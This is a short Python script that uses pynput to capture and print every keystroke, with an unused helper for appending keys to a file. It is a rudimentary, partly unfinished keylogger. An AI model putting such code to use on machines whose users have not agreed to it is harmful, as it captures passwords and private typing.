import pynput
from pynput.keyboard import Key, Listener

# count = 0
# keys = []

def on_press(key):
   # global keys, count
    print(format(key))

def write_file(keys):
    with open("file.txt", "a") as f:
        for key in keys:
            f.write(key)

def on_realease(key):
    if key == Key.esc:
        return False
    elif key == Key.space:
        return (" ")

with Listener (on_press=on_press, on_release=on_realease) as listener:
    listener.join()